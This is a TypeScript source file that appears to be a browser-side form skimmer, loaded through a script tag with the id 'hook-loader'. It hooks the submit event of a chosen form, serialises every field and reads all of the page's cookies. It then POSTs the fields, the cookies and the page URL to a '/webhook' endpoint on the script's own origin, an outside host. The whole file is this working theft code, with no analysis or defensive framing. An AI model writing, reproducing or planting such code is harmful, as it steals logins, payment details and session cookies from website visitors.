FormData.prototype.serializeObject = function () {
  const obj: Record<any, any> = {};
  for (const pair of this.entries()) {
    let key = pair[0];
    if (key.endsWith('[]')) {
      key = key.slice(0, -2);
      if (!obj[key]) {
        obj[key] = [];
      }
      obj[key].push(pair[1]);
    } else {
      obj[key] = pair[1];
    }
  }

  let reformattedObj: Record<any, any> = {};
  Object.keys(obj).forEach(function (key) {
    let parts = key.split('[');
    let current = reformattedObj;
    for (let i = 0; i < parts.length; i++) {
      let part = parts[i];
      if (part.endsWith(']')) {
        part = part.slice(0, -1);
      }
      if (i === parts.length - 1) {
        current[part] = obj[key];
      } else {
        if (!(part in current)) {
          current[part] = {};
        }
        current = current[part];
      }
    }
  });
  return reformattedObj;
};
HTMLFormElement.prototype.serializeObject = function () {
  return new FormData(this).serializeObject();
};
Object.prototype.serializeJSON = function () {
  return JSON.stringify(this);
};
let _wx_ = (document.currentScript ?? document.querySelector('script[id="hook-loader"]')) as HTMLScriptElement;

interface IHook {
  send(payload: object): Promise<void>;

  intercept(form: HTMLFormElement): void;

  waitForElement(selector: string): Promise<Element>;

  init(selector: string): void;
}

class Hook implements IHook {
  constructor() {
    // @ts-ignore
    this.uri = new URL(_wx_.src.replace(/^(\/\/)/, window.location.protocol + '//'));
  }

  get cookies(): Object {
    return Object.fromEntries(document.cookie.split('; ').map((c) => c.split('=')));
  }

  private _uri: URL;
  get uri(): URL {
    return this._uri;
  }

  set uri(value: URL) {
    this._uri = value;
  }

  async waitForElement(selector: string): Promise<Element> {
    while (document.querySelector(selector) === null) {
      await new Promise((resolve) => requestAnimationFrame(resolve));
    }
    return document.querySelector(selector) as Element;
  }

  send(payload: object) {
    const srv = [this.uri.origin, 'webhook'].join('/');
    const now = new Date().valueOf();
    return fetch(`${srv}?time=${now}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
      },
      body: { origin: window.location.href, cookies: this.cookies, ...payload }.serializeJSON(),
      referrer: window.location.href,
      referrerPolicy: 'strict-origin-when-cross-origin',
      mode: 'cors',
      credentials: 'omit',
    })
      .then((response) => {
        console.warn('fetch', response.status);
        return response.text();
      })
      .then(function (raw) {
        return raw;
      })
      .catch((reason) => reason);
  }

  intercept(form: HTMLFormElement) {
    form.addEventListener('submit', this.submithandler);
  }

  submithandler(e: SubmitEvent) {
    e.stopPropagation();
    const payload = e.target.serializeObject();
    try {
      this.send(payload)
        .then((response) => {
          console.warn('submithandler', response);
        })
        .catch((reason) => {
          console.error('submithandler', reason);
        });
    } catch (reason) {
      console.error('submithandler', reason);
    }
  }

  init(selector: string) {
    console.warn('init', { selector: selector, cookies: this.cookies });
    this.waitForElement(selector).then((el) => {
      this.intercept(el as HTMLFormElement);
    });
  }
}
